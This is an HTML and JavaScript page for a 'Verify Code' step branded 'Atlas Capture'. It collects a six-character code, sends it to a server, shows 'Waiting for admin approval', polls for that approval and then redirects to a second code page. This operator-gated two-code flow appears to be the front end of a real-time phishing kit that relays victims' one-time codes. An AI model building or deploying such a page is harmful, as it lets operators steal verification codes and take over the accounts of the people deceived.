<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}

body{
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:40px 10px;
}

.wrapper{max-width:420px;width:100%}

.header{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:18px;
}
.logo{
  width:34px;height:34px;
  border-radius:8px;
  background:#4f46e5;
}
.header span{font-weight:600;font-size:18px}

.card{
  background:#fff;
  border-radius:22px;
  padding:32px 22px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  text-align:center;
}

.otp-icon{
  width:64px;
  height:64px;
  background:#eef2ff;
  border-radius:32px;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 20px;
}
.otp-icon svg{
  width:32px;
  height:32px;
  stroke:#4f46e5;
}

h2{
  font-size:24px;
  font-weight:700;
  color:#1f2937;
  margin-bottom:8px;
}

.subtext{
  color:#6b7280;
  font-size:14px;
  margin-bottom:28px;
}

.otp-group{
  display:flex;
  gap:12px;
  justify-content:center;
  margin-bottom:28px;
  flex-wrap:wrap;
}
.otp-input{
  width:52px;
  height:60px;
  text-align:center;
  font-size:24px;
  font-weight:600;
  border:2px solid #e5e7eb;
  border-radius:14px;
  background:#fff;
  transition:all 0.2s;
}
.otp-input:focus{
  outline:none;
  border-color:#4f46e5;
  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
}

button{
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:linear-gradient(90deg,#2563eb,#7c3aed);
  color:#fff;
  font-weight:600;
  cursor:pointer;
  margin-bottom:16px;
}
button:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.button-loading{
  display:inline-flex;
  align-items:center;
  gap:8px;
}
.spinner{
  width:18px;
  height:18px;
  border:2px solid rgba(255,255,255,0.3);
  border-top-color:white;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}
@keyframes spin{
  to{transform:rotate(360deg);}
}

.link{
  background:none;
  color:#4f46e5;
  font-size:14px;
  font-weight:500;
  margin:0;
  padding:0;
  box-shadow:none;
}
.link:hover{
  background:none;
  text-decoration:underline;
}

.error-message{
  color:#ef4444;
  font-size:13px;
  margin-top:12px;
  display:none;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="logo"></div>
    <span>Atlas Capture</span>
  </div>

  <div class="card">
    <div class="otp-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
        <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="#4f46e5"/>
        <line x1="3" y1="9" x2="21" y2="9" stroke="#4f46e5"/>
        <line x1="9" y1="21" x2="9" y2="9" stroke="#4f46e5"/>
      </svg>
    </div>
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 6-character verification code</p>

    <div class="otp-group" id="otpGroup">
      <input type="text" class="otp-input" maxlength="1" id="digit1">
      <input type="text" class="otp-input" maxlength="1" id="digit2">
      <input type="text" class="otp-input" maxlength="1" id="digit3">
      <input type="text" class="otp-input" maxlength="1" id="digit4">
      <input type="text" class="otp-input" maxlength="1" id="digit5">
      <input type="text" class="otp-input" maxlength="1" id="digit6">
    </div>

    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
    <div id="errorMessage" class="error-message"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const inputs = ['digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6'];
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('errorMessage');
  let isProcessing = false;
  let approvalInterval = null;

  inputs.forEach((id, index) => {
    const input = document.getElementById(id);
    
    input.addEventListener('input', (e) => {
      // NO UPPERCASE CONVERSION - keep as is
      if (e.target.value.length === 1 && index < 5) {
        document.getElementById(inputs[index + 1]).focus();
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) {
        document.getElementById(inputs[index - 1]).focus();
      }
    });
    
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text');
      const chars = pasted.slice(0, 6);
      chars.split('').forEach((char, i) => {
        if (inputs[i]) {
          document.getElementById(inputs[i]).value = char;
        }
      });
      if (chars.length === 6) {
        verifyOTP();
      }
    });
  });

  function getOTP() {
    let otp = '';
    for (let i = 0; i < inputs.length; i++) {
      const val = document.getElementById(inputs[i]).value;
      if (!val) return null;
      otp += val;
    }
    return otp;
  }

  function showLoading() {
    isProcessing = true;
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    errorDiv.style.display = 'none';
  }

  function showWaitingForApproval() {
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin approval...</span>';
  }

  function hideLoading() {
    isProcessing = false;
    verifyBtn.disabled = false;
    verifyBtn.innerHTML = 'Verify';
  }

  function startCheckingApproval() {
    if (approvalInterval) clearInterval(approvalInterval);
    approvalInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/users/check-first-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.approved) {
          clearInterval(approvalInterval);
          // Redirect to second OTP page
          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  async function verifyOTP() {
    if (isProcessing) return;
    const otp = getOTP();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      return;
    }

    showLoading();
    try {
      const response = await fetch('/api/users/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await response.json();
      if (data.success) {
        showWaitingForApproval();
        startCheckingApproval();
      } else {
        hideLoading();
        errorDiv.textContent = data.error || 'Invalid OTP';
        errorDiv.style.display = 'block';
      }
    } catch (error) {
      hideLoading();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
    }
  }

  verifyBtn.addEventListener('click', verifyOTP);
  document.getElementById('digit1').focus();
  document.getElementById('differentEmail').addEventListener('click', () => {
    window.location.href = '/users/login';
  });
</script>

</body>
</html>
